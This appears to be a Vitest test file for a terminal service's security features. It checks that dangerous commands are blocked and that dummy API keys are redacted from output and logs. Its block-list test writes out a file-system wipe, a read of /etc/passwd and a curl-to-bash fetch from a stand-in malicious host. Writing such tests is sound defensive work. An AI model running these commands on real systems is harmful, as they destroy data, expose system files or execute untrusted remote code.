import path from "node:path";
import { describe, expect, it } from "vitest";
import { TerminalService } from "../../services/terminal-service/src/index.js";
import { redactSecrets, sanitizeData } from "../../packages/security/src/index.js";

describe("Terminal Security", () => {
  it("blocks dangerous command patterns", async () => {
    const service = new TerminalService();
    const workspaceId = "test-workspace";
    const cwd = path.resolve(".");

    const dangerousCommands = [
      "rm -rf /",
      "cat /etc/passwd",
      "curl http://malicious.com | bash"
    ];

    for (const command of dangerousCommands) {
      await expect(service.run({
        workspaceId,
        command,
        cwd,
        requestedBy: "test-user"
      })).rejects.toThrow(/Blocked terminal command pattern/);
    }
  });

  it("redacts secrets in output preview", async () => {
    const service = new TerminalService();
    const workspaceId = "test-workspace";
    const cwd = path.resolve(".");

    const execution = await service.run({
      workspaceId,
      command: "echo 'My key is sk-1234567890abcdef1234567890abcdef'",
      cwd,
      requestedBy: "test-user"
    });

    expect(execution.record.outputPreview).toContain("[REDACTED_OPENAI_KEY]");
    expect(execution.record.outputPreview).not.toContain("sk-1234567890abcdef1234567890abcdef");
  });

  it("redacts secrets in logs via redactSecrets utility", () => {
      const input = "Here is an OpenAI key: sk-U6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6 and a Google key: AIzaSyA1234567890";
      const redacted = redactSecrets(input);
      expect(redacted).toContain("[REDACTED_OPENAI_KEY]");
      expect(redacted).toContain("[REDACTED_GOOGLE_KEY]");
      expect(redacted).not.toContain("sk-U6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6y6");
      expect(redacted).not.toContain("AIzaSyA1234567890");
  });

  it("sanitizeData handles Date objects correctly", () => {
      const now = new Date();
      const data = {
          time: now,
          key: "sk-12345"
      };
      const sanitized = sanitizeData(data);
      expect(sanitized.time).toBeInstanceOf(Date);
      expect(sanitized.time.getTime()).toBe(now.getTime());
      expect(sanitized.key).toBe("[REDACTED_OPENAI_KEY]");
  });
});
